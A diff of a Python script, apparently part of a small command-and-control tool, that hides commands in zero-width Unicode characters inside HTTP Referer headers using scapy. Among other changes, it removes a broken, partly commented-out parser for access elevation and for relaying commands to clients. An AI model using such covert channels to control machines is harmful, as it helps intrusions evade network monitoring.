@@ -2,8 +2,7 @@
 # from scapy.layers.inet import IP
 # from scapy.sendrecv import send
 # from scapy.all import *
-# load_layer('http')
-# from scapy.layers.http import HTTPRequest
+load_layer('http')
 
 zero = '\u200c'  # 0
 one = '\u200d'  # 1
@@ -38,7 +37,7 @@ def binary_converter(message):
     elif msg_list[0] == 'CLIENTS':
         res = clients
     elif msg_list[0] == 'ACCESS':
-        res = access
+        res = access + msg_list[1]
 
     return res
     # binary_to_unicode(res)
@@ -46,7 +45,7 @@ def binary_converter(message):
 
 def binary_to_unicode(message):
     final_res = ''
-    print("LEN: " + str(len(message)))
+    # print("LEN: " + str(len(message)))
     for i in message:
         if i == '0':
             final_res += zero
@@ -109,31 +108,6 @@ def binary_deconverter(message):
         command = "ACCESS"
         return command
 
-def parser(self, message):
-        message_tmp = message.split()
-
-        if message_tmp[0] == 'COMMAND':
-
-
-        # print(message)
-        # message = message[:100].split()
-        # print(message)
-        # if message != []:
-        #     command = message[0]
-        #     if command == "ACCESS" and len(message) == 2:
-        #             client_instance.elevatation(message[1])
-        #     elif client_instance.elevated:
-        #         print(client_instance.elevated)
-        #         if command == "CLIENTS" and len(message) == 1:
-        #                 self.cc.clients(client_instance)
-        #         elif command == "COMMAND":
-        #             if len(message) == 3:
-        #                 print("Commad")
-        #                 self.cc.command(message[1], message[2])
-        #             elif len(message) == 4:
-        #                 self.cc.command(message[1], message[2], message[3])
-        #         elif command == "DROP" and len(message) == 1:
-        #                 client_instance.elevatation()
 
 def construct_packet(addr, input):
         r_input = binary_converter(input)
@@ -150,4 +124,4 @@ def deconstruct_packet(self, packet):
     message = packet[HTTPRequest].Referer
     message = unicode_to_binary(message.encode())
     message = binary_deconverter(message)
-    print(message)
+    return message
